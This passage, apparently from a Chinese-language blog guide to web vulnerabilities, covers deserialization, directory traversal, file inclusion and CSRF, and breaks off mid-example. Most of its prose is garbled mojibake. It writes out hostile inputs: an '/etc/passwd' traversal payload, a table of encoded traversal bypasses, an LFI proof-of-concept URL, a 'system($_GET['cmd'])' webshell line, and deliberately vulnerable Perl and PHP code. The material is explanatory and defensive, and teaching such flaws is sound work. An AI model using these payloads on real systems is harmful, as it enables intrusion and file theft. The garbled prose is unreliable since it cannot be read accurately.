¼å¼çš„è¿‡ç¨‹ã€‚äººä»¬ç»å¸¸åºåˆ—åŒ–å¯¹è±¡ï¼Œä»¥å°†å…¶ä¿å­˜åˆ°å­˜å‚¨ä¸­æˆ–ä½œä¸ºé€šä¿¡çš„ä¸€éƒ¨åˆ†è¿›è¡Œå‘é€ã€‚</p></li><li><p>ååºåˆ—åŒ–æ˜¯è¯¥è¿‡ç¨‹çš„é€†è¿‡ç¨‹ï¼Œå®ƒé‡‡ç”¨æŸç§æ ¼å¼æ„é€ æ•°æ®ï¼Œç„¶åå°†å…¶é‡å»ºä¸ºå¯¹è±¡ã€‚å¦‚ä»Šï¼Œç”¨äºåºåˆ—åŒ–æ•°æ®çš„æœ€æµè¡Œçš„æ•°æ®æ ¼å¼æ˜¯<code>JSON</code>ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå®ƒæ˜¯<code>XML</code>ã€‚</p></li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li>ååºåˆ—åŒ–å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»ï¼Œè¿™æ˜¯å¯èƒ½å‘ç”Ÿçš„æœ€ä¸¥é‡çš„æ”»å‡»ä¹‹ä¸€ã€‚</li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>Â·Â·Â·Â·Â·Â· </p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>é»‘ç›’æµ‹è¯•ï¼š</p><p>æœç´¢ä»¥ä¸‹ä»¥ä¸‹åˆ—å¼€å¤´çš„<code>base64</code>ç¼–ç çš„å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAEAAAD/////</span><br></pre></td></tr></table></figure><p>æœç´¢å¸¦æœ‰ä»¥ä¸‹æ–‡æœ¬çš„å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TypeObject</span><br><span class="line">$type:</span><br></pre></td></tr></table></figure><p>ç™½ç›’æµ‹è¯•ï¼š</p><p>åœ¨æºä»£ç ä¸­æœç´¢ä»¥ä¸‹æœ¯è¯­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TypeNameHandling</span><br><span class="line">JavaScriptTypeResolver</span><br></pre></td></tr></table></figure></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>ä¸å…è®¸æ•°æ®æµå®šä¹‰å°†ååºåˆ—åŒ–åˆ°çš„å¯¹è±¡çš„ç±»å‹ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨<code>DataContractSerializer</code>æˆ–<code>XmlSerializer</code>å°½å¯èƒ½é¿å…è¿™ç§æƒ…å†µã€‚</p></li><li><p>ä½¿ç”¨æ›¿ä»£æ•°æ®æ ¼å¼ï¼šé€šè¿‡é¿å…æœ¬æœºï¼ˆåï¼‰åºåˆ—åŒ–æ ¼å¼ï¼Œå¯ä»¥å¤§å¤§é™ä½é£é™©ã€‚é€šè¿‡åˆ‡æ¢ä¸º<code>JSON</code>æˆ–<code>XML</code>ä¹‹ç±»çš„çº¯æ•°æ®æ ¼å¼ï¼Œå¯ä»¥å‡å°‘è‡ªå®šä¹‰ååºåˆ—åŒ–é€»è¾‘é‡æ–°ç”¨äºæ¶æ„ç›®çš„çš„æœºä¼šã€‚</p></li><li><p>ä»…ååºåˆ—åŒ–ç­¾åæ•°æ®ï¼šå¦‚æœåº”ç”¨ç¨‹åºåœ¨ååºåˆ—åŒ–ä¹‹å‰çŸ¥é“éœ€è¦å¤„ç†å“ªäº›æ¶ˆæ¯ï¼Œåˆ™å¯ä»¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹å®ƒä»¬è¿›è¡Œç­¾åã€‚ç„¶åï¼Œåº”ç”¨ç¨‹åºå¯ä»¥é€‰æ‹©ä¸å¯¹æ²¡æœ‰èº«ä»½éªŒè¯ç­¾åçš„ä»»ä½•æ¶ˆæ¯è¿›è¡Œååºåˆ—åŒ–ã€‚</p></li></ul><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li>ç”±äº<code>Web</code>æœåŠ¡å™¨æˆ–è€…<code>Web</code>åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åç§°çš„å®‰å…¨æ€§éªŒè¯ä¸è¶³è€Œå¯¼è‡´çš„ä¸€ç§å®‰å…¨æ¼æ´ï¼Œä½¿å¾—æ”»å‡»è€…é€šè¿‡åˆ©ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦å°±å¯ä»¥ç»•è¿‡æœåŠ¡å™¨çš„å®‰å…¨é™åˆ¶ï¼Œè®¿é—®ä»»æ„çš„æ–‡ä»¶ï¼ˆå¯ä»¥ä½¿<code>Web</code>æ ¹ç›®å½•ä»¥å¤–çš„æ–‡ä»¶ï¼‰ï¼Œç”šè‡³æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ç¨‹åºåœ¨å®ç°ä¸Šæ²¡æœ‰å……åˆ†è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„<code>../</code>ä¹‹ç±»çš„ç›®å½•è·³è½¬ç¬¦ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡æäº¤ç›®å½•è·³è½¬æ¥éå†æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿåˆ›å»ºï¼Œè¦†ç›–ï¼Œåˆ é™¤æˆ–ç ´åï¼Œç”¨äºæ‰§è¡Œä»£ç çš„å…³é”®æ–‡ä»¶ï¼Œä¾‹å¦‚ç¨‹åºæˆ–åº“ã€‚</p></li><li><p>å¦‚æœç›®æ ‡æ–‡ä»¶ç”¨äºå®‰å…¨æœºåˆ¶ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿç»•è¿‡è¯¥æœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œåœ¨å¯†ç æ–‡ä»¶æœ«å°¾é™„åŠ æ–°å¸æˆ·å¯èƒ½ä½¿æ”»å‡»è€…å¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯ã€‚</p></li><li><p>æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿè¯»å–æ„å¤–æ–‡ä»¶çš„å†…å®¹å¹¶æš´éœ²æ•æ„Ÿæ•°æ®ã€‚å¦‚æœç›®æ ‡æ–‡ä»¶ç”¨äºå®‰å…¨æœºåˆ¶ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿç»•è¿‡è¯¥æœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡è¯»å–å¯†ç æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£å¯†ç çŒœæµ‹æ”»å‡»ï¼Œä»¥ä¾¿è·å–ç›®æ ‡ç³»ç»Ÿå¸æˆ·æƒé™ã€‚</p></li><li><p>å¯èƒ½ä¼šå®Œå…¨é˜»æ­¢ç›®æ ‡è¿è¡Œï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨è¯¸å¦‚èº«ä»½éªŒè¯ä¹‹ç±»çš„ä¿æŠ¤æœºåˆ¶çš„æƒ…å†µä¸‹ï¼Œå®ƒå¯èƒ½ä¼šé”å®šç›®æ ‡çš„æ¯ä¸ªç”¨æˆ·ã€‚</p></li><li><p>æ”»å‡»è€…å¯èƒ½ä½¿ç”¨ç›®å½•éå†æ¥ä¸‹è½½æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ•æ„Ÿä¿¡æ¯å¹¶å¯èƒ½æš´éœ²æ›´å¤šæœåŠ¡å™¨æ¼æ´ã€‚æœ€ç»ˆï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®æœºå¯†ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šä»¥ä¸‹æ˜¯<code>perl</code>è¯­è¨€çš„ç›®å½•éå†ä»£ç ç¤ºä¾‹ï¼Œå…¶ä¸­æ¯ä¸ªç”¨æˆ·çš„ä¸ªäººèµ„æ–™ä¿¡æ¯éƒ½å­˜å‚¨åœ¨å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”æ‰€æœ‰æ–‡ä»¶éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªç›®å½•ä¸­ã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $dataPath = <span class="string">"/users/root/profiles"</span>;</span><br><span class="line"><span class="keyword">my</span> $username = param(<span class="string">"user"</span>);</span><br><span class="line"><span class="keyword">my</span> $profilePath = $dataPath . <span class="string">"/"</span> . $username;</span><br><span class="line"><span class="keyword">open</span>(<span class="keyword">my</span> $fh, <span class="string">"&lt;$profilePath"</span>) || ExitError(<span class="string">"profile read error: $profilePath"</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;ul&gt;\n"</span>;</span><br><span class="line"><span class="keyword">while</span> (&lt;$fh&gt;) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;li&gt;$_&lt;/li&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;/ul&gt;\n"</span>;</span><br></pre></td></tr></table></figure><p>â€‹    æ”»å‡»è€…å¯ä»¥æ„é€ ä»¥ä¸‹<code>payload</code>è¿›è¡Œæ”»å‡»ï¼Œæ‰“å¼€æ–‡ä»¶åï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨è·¯å¾„è§„èŒƒåŒ–æœŸé—´è§£æâ€œ<code>../</code>â€ï¼Œå¹¶çœŸå®è®¿é—®æ­¤æ–‡ä»¶ï¼šâ€œ<code>/etc/passwd</code>â€ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–å¯†ç æ–‡ä»¶çš„å†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/users/root/profiles/../../../etc/passwd</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>æ”»å‡»è€…é€šè¿‡è®¿é—®æ ¹ç›®å½•ï¼Œå‘é€ä¸€ç³»åˆ—â€œ<code>../</code>â€å­—ç¬¦æ¥éå†é«˜å±‚ç›®å½•ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œç”šè‡³ä½¿ç³»ç»Ÿå´©æºƒï¼Œå¹¶ä¸”å°è¯•æ‰¾åˆ°ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶æˆ–è€…ç³»ç»Ÿä¸­å­˜åœ¨çš„æ•æ„Ÿæ–‡ä»¶ã€‚</p></li><li><p>ä¹Ÿå¯é€šè¿‡åˆ¤æ–­ç½‘ç«™è¯­è¨€ï¼Œå¹¶æ ¹æ®å…¶<code>url</code>ä¸­éƒ¨åˆ†æä¾›çš„å‚æ•°ï¼Œè¿›è¡Œæ„é€ ç›¸å…³çš„è·¯å¾„ä¿¡æ¯ï¼Œå¦‚æ”¶é›†åˆ°ç½‘ç«™ä¸­é—´ä»¶ç‰ˆæœ¬ä¸º<code>apache</code>ï¼Œåˆ™æƒ³åŠæ³•æ„é€ <code>../../../Web-INF/Web.xml</code>ç­‰ï¼Œç„¶åæŸ¥çœ‹å…¶æ˜¯å¦å¯è¢«ä¸‹è½½å‡ºæ¥ã€‚éšåå¯æ„é€ ä¸‹è½½ç³»ç»Ÿæ–‡ä»¶ã€‚</p></li><li><p>ç¼–ç æˆ–è€…å¤šé‡ç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ç¼–ç æˆ–å¤šé‡ç¼–ç    |   æ˜ç å†…å®¹ </span><br><span class="line">%2e%2e%2f       |   ../   </span><br><span class="line">%2e%2e/         |   ../   </span><br><span class="line">..%2f           |   ../  </span><br><span class="line">%2e%2e%5c       |   ..\   </span><br><span class="line">%2e%2e\         |   ..\   </span><br><span class="line">..%5c           |   ..\  </span><br><span class="line">%252e%252e%255c |   ..\  </span><br><span class="line">..%255c         |   ..\   </span><br><span class="line">..%c0%af        |   ../   </span><br><span class="line">..%c1%9c        |   ..\</span><br></pre></td></tr></table></figure></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>é˜²æ­¢æ–‡ä»¶è·¯å¾„éå†æ¼æ´çš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥å®Œå…¨ä¼ é€’ç»™æ–‡ä»¶ç³»ç»Ÿ<code>API</code>ã€‚</p></li><li><p>éœ€å¯¹ç”¨æˆ·æäº¤çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä¸»è¦æŒ‡è¿‡æ»¤ç›®å½•è·³è½¬ç¬¦â€œ<code>../</code>â€ï¼Œå­—ç¬¦æˆªæ–­ç¬¦ï¼Œ<code>dir</code>å‘½ä»¤ç­‰ã€‚</p></li><li><p>ä¸¥æ ¼æ§åˆ¶<code>Web</code>æ ¹ç›®å½•çš„æƒé™ã€‚</p></li></ul><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li>æ–‡ä»¶åŒ…å«æ˜¯æŒ‡ç¨‹åºä»£ç åœ¨å¤„ç†åŒ…å«æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰ä¸¥æ ¼æ§åˆ¶ã€‚ä¸»è¦åŒ…æ‹¬æœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ä¸¤ç§å½¢å¼ï¼Œç”±äºå¼€å‘äººå‘˜ç¼–å†™æºç ï¼Œå¼€æ”¾ç€å°†å¯é‡å¤ä½¿ç”¨çš„ä»£ç æ’å…¥åˆ°å•ä¸ªçš„æ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨éœ€è¦çš„æ—¶å€™å°†å®ƒä»¬åŒ…å«åœ¨ç‰¹æ®Šçš„åŠŸèƒ½ä»£ç æ–‡ä»¶ä¸­ï¼Œç„¶ååŒ…å«æ–‡ä»¶ä¸­çš„ä»£ç ä¼šè¢«è§£é‡Šæ‰§è¡Œã€‚ç”±äºå¹¶æ²¡æœ‰é’ˆå¯¹ä»£ç ä¸­å­˜åœ¨æ–‡ä»¶åŒ…å«çš„å‡½æ•°å…¥å£åšè¿‡æ»¤ï¼Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æäº¤æ¶æ„æ„é€ è¯­å¥æäº¤ï¼Œå¹¶äº¤ç”±æœåŠ¡å™¨ç«¯è§£é‡Šæ‰§è¡Œã€‚æ–‡ä»¶åŒ…å«æ”»å‡»ä¸­<code>Web</code>æœåŠ¡å™¨æºç é‡Œå¯èƒ½å­˜åœ¨<code>inlcude()</code>æ­¤ç±»æ–‡ä»¶åŒ…å«æ“ä½œå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å®¢æˆ·ç«¯æ„é€ æäº¤æ–‡ä»¶è·¯å¾„ï¼Œæ˜¯è¯¥æ¼æ´æ”»å‡»æˆåŠŸçš„æœ€ä¸»è¦åŸå› ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>æ–‡ä»¶åŒ…å«æ¼æ´ä¼šå¯¼è‡´ç”¨æˆ·å¯ä»¥æ„é€ å‚æ•°åŒ…å«è¿œç¨‹ä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œå¹¶å¾—åˆ°ç½‘ç«™é…ç½®æˆ–è€…æ•æ„Ÿæ–‡ä»¶ï¼Œè¿›è€Œè·å–åˆ°æœåŠ¡å™¨æƒé™ï¼Œé€ æˆç½‘ç«™è¢«æ¶æ„åˆ é™¤ï¼Œç”¨æˆ·å’Œäº¤æ˜“æ•°æ®è¢«ç¯¡æ”¹ç­‰ä¸€ç³»åˆ—æ¶æ€§åæœã€‚</p></li><li><p>å³ä½¿æ²¡æœ‰ä¸Šè½½å’Œæ‰§è¡Œä»£ç çš„èƒ½åŠ›ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¹Ÿå¯èƒ½å¾ˆå±é™©ã€‚æ”»å‡»è€…ä»ç„¶å¯ä»¥ä½¿ç”¨<code>LFI</code>æ¼æ´æ‰§è¡Œç›®å½•éå†/è·¯å¾„éå†æ”»å‡»ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šä»¥ä¸‹æ˜¯<code>php</code>å­˜åœ¨æ–‡ä»¶åŒ…å«çš„é—®é¢˜ä»£ç ï¼Œé€šè¿‡ä½¿ç”¨æä¾›çš„â€™<code>module_name</code>â€˜å‚æ•°å¹¶å°†å­—ç¬¦ä¸²â€™<code>/function.php</code>â€˜é™„åŠ åˆ°â€™<code>module_name</code>â€˜ä¹‹åï¼Œå¯ä»¥æ„å»ºæ–‡ä»¶çš„è·¯å¾„ã€‚é€šè¿‡å¯¹ â€˜<code>module_name</code>â€™å‚æ•°è¿›è¡Œæ„é€ â€™<code>?module_name=abc/function.php</code>â€™ï¼Œå¦‚æœâ€™<code>function.php</code>â€™å†…å®¹æ˜¯â€™ <code>system($_GET[&#39;cmd&#39;]);</code>â€™ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„<code>payload</code> â€˜ <code>?module_name=abc&amp;cmd=/etc/passwd</code>â€™ï¼Œæ¥è¯»å–ç›®æ ‡æœåŠ¡å™¨çš„æ•æ„Ÿæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$dir = $_GET[<span class="string">'module_name'</span>];</span><br><span class="line"><span class="keyword">include</span>($dir . <span class="string">"/function.php"</span>);</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>é€šè¿‡ä»£ç å®¡è®¡çš„æ–¹å¼æ£€æŸ¥ä»£ç é‡Œå‡ºç°includeæˆ–requireçš„ä»£ç æ®µï¼›</p></li><li><p>å…¸å‹çš„æ¦‚å¿µéªŒè¯æ˜¯åŠ è½½passwdæ–‡ä»¶ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable_host/preview.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸæ‰§è¡Œåˆ™ä¼šå›æ˜¾ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">alex:x:500:500:alex:/home/alex:/bin/bash</span><br><span class="line">margo:x:501:501::/home/margo:/bin/bash</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>ä¸ºé¿å…æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆ<code>LFI</code>ï¼‰å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆ<code>RFI</code>ï¼‰ï¼Œä¿è¯ç”¨æˆ·è¾“å…¥ä¸å¯ä¿¡ã€‚å¦‚æœéœ€è¦åœ¨ç½‘ç«™æˆ–Webåº”ç”¨ç¨‹åºä»£ç ä¸­åŒ…å«æœ¬åœ°æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨å…è®¸çš„æ–‡ä»¶åå’Œä½ç½®çš„ç™½åå•ã€‚ä½¿ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œç¡®ä¿æ”»å‡»è€…æ— æ³•æ›¿æ¢è¿™äº›æ–‡ä»¶ã€‚</p></li><li><p>éœ€å¯¹ç”¨æˆ·æäº¤çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä¸»è¦æŒ‡è¿‡æ»¤ç›®å½•è·³è½¬ç¬¦â€œ<code>../</code>â€ï¼Œå­—ç¬¦æˆªæ–­ç¬¦ï¼Œ<code>dir</code>å‘½ä»¤ç­‰ã€‚</p></li><li><p>ä¸¥æ ¼æ§åˆ¶<code>Web</code>æ ¹ç›®å½•çš„æƒé™ã€‚</p></li></ul><h3 id="è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰"><a href="#è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰" class="headerlink" title="è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰"></a>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><code>CSRF</code>ï¼ˆ<code>Cross-site request forgery</code>ï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼šæ”»å‡»è€…è¯±å¯¼å—å®³è€…è¿›å…¥ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸­ï¼Œå‘è¢«æ”»å‡»ç½‘ç«™å‘é€è·¨ç«™è¯·æ±‚ã€‚åˆ©ç”¨å—å®³è€…åœ¨è¢«æ”»å‡»ç½‘ç«™å·²ç»è·å–çš„æ³¨å†Œå‡­è¯ï¼Œç»•è¿‡åå°çš„ç”¨æˆ·éªŒè¯ï¼Œè¾¾åˆ°å†’å……ç”¨æˆ·å¯¹è¢«æ”»å‡»çš„ç½‘ç«™æ‰§è¡ŒæŸé¡¹æ“ä½œçš„ç›®çš„ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>è·å¾—ç‰¹æƒæˆ–æ‰¿æ‹…èº«ä»½ï¼›ç»•è¿‡ä¿æŠ¤æœºåˆ¶ï¼›è¯»å–åº”ç”¨æ•°æ®ï¼›ä¿®æ”¹ç”³è¯·æ•°æ®ï¼›DoSæ”»å‡»ï¼šä½¿ç›®æ ‡å´©æºƒï¼Œé€€å‡ºæˆ–é‡æ–°å¯åŠ¨ã€‚</p></li><li><p>æ”»å‡»è€…å¯ä»¥æˆåŠŸåœ°æ‰§è¡Œä»»ä½•æ“ä½œï¼Œå†³å®šäºå—å®³è€…çš„æƒé™ã€‚å¦‚æœå—å®³è€…æ˜¯ç®¡ç†å‘˜æˆ–ç‰¹æƒç”¨æˆ·ï¼Œåˆ™åæœå¯èƒ½åŒ…æ‹¬è·å¾—å¯¹Webåº”ç”¨ç¨‹åºçš„å®Œå…¨æ§åˆ¶-åˆ é™¤æˆ–çªƒå–æ•°æ®ï¼Œå¸è½½äº§å“æˆ–ä½¿ç”¨å®ƒå¯¹äº§å“çš„æ‰€æœ‰è€…å‘èµ·å…¶ä»–æ”»å‡»ã€‚ç”±äºæ”»å‡»è€…è·å–äº†å—å®³è€…çš„æƒé™ï¼Œå› æ­¤CSRFçš„å½±å“èŒƒå›´ä»…å—å—å®³è€…çš„ç‰¹æƒé™åˆ¶ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼š</p><p>â€‹    å—å®³è€…ç™»å½•<code>a.com</code>ï¼Œå¹¶ä¿ç•™äº†ç™»å½•å‡­è¯ï¼ˆ<code>Cookie</code>ï¼‰ã€‚</p><p>â€‹    æ”»å‡»è€…å¼•è¯±å—å®³è€…è®¿é—®äº†<code>b.com</code>ã€‚</p><p>â€‹    <code>b.com</code>å‘ <code>a.com</code> å‘é€äº†ä¸€ä¸ªè¯·æ±‚ï¼š<code>a.com/act=xx</code>ã€‚æµè§ˆå™¨ä¼šé»˜è®¤æºå¸¦<code>a.com</code>çš„<code>Cookie</code>ã€‚</p><p>â€‹    <code>a.com</code>æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå¯¹è¯·æ±‚è¿›è¡ŒéªŒè¯ï¼Œå¹¶ç¡®è®¤æ˜¯å—å®³è€…çš„å‡­è¯ï¼Œè¯¯ä»¥ä¸ºæ˜¯å—å®³è€…è‡ªå·±å‘é€çš„è¯·æ±‚ã€‚</p><p>â€‹    <code>a.com</code>ä»¥å—å®³è€…çš„åä¹‰æ‰§è¡Œäº†<code>act=xx</code>ã€‚</p><p>â€‹    æ”»å‡»å®Œæˆï¼Œæ”»å‡»è€…åœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå†’å……å—å®³è€…ï¼Œè®©<code>a.com</code>æ‰§è¡Œäº†è‡ªå·±å®šä¹‰çš„æ“ä½œã€‚</p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>æ”»å‡»è€…æœ‰ç†ç”±è¯±ä½¿åº”ç”¨ç¨‹åºä¸­å‘ç”ŸæŸç§åŠ¨ä½œã€‚è¿™å¯èƒ½æ˜¯ç‰¹æƒæ“ä½œï¼ˆä¾‹å¦‚ï¼Œä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æƒé™ï¼‰æˆ–å¯¹ç”¨æˆ·ç‰¹å®šæ•°æ®çš„ä»»ä½•æ“ä½œï¼ˆä¾‹å¦‚ï¼Œæ›´æ”¹ç”¨æˆ·è‡ªå·±çš„å¯†ç ï¼‰ã€‚</p></li><li><p>æ‰§è¡Œè¯¥æ“ä½œæ¶‰åŠå‘å‡ºä¸€ä¸ªæˆ–å¤šä¸ª<code>HTTP</code>è¯·æ±‚ï¼Œå¹¶ä¸”è¯¥åº”ç”¨ç¨‹åºä»…ä¾é ä¼šè¯<code>cookie</code>æ¥æ ‡è¯†å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–æœºåˆ¶å¯ä»¥è·Ÿè¸ªä¼šè¯æˆ–éªŒè¯ç”¨æˆ·è¯·æ±‚ã€‚</p></li><li><p>æ‰§è¡Œè¯¥æ“ä½œçš„è¯·æ±‚ä¸åŒ…å«æ”»å‡»è€…æ— æ³•ç¡®å®šæˆ–çŒœæµ‹å…¶å€¼çš„ä»»ä½•å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå½“ä½¿ç”¨æˆ·æ›´æ”¹å¯†ç æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦çŸ¥é“ç°æœ‰å¯†ç çš„å€¼ï¼Œåˆ™è¯¥åŠŸèƒ½ä¸ä¼šå—åˆ°å½±å“ã€‚</p></li><li><p>ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªåº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªåŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½ä½¿ç”¨æˆ·å¯ä»¥æ›´æ”¹å…¶å¸æˆ·ä¸Šçš„ç”µå­é‚®ä»¶åœ°å€ã€‚ç”¨æˆ·æ‰§è¡Œæ­¤æ“ä½œæ—¶ï¼Œå°†å‘å‡ºå¦‚ä¸‹<code>HTTP</code>è¯·æ±‚ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/email/change</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 30</span><br><span class="line"><span class="attribute">Cookie</span>: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span><br><span class="line"></span><br><span 